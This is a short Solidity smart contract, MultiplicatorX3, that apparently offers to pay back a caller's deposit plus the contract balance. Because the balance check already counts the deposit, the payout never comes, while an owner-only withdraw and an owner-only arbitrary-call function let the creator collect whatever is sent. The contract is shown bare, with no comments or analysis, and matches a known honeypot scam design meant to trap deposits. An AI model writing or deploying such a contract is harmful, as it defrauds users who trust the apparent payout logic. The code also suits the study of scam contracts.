pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _to, bytes _data) public payable {
        require(msg.sender == owner);
        require(_to.call.value(msg.value)(_data));
    }

    function multiplicate(address _to) public payable {
        if (msg.value >= this.balance) {
            _to.transfer(this.balance + msg.value);
        }
    }
}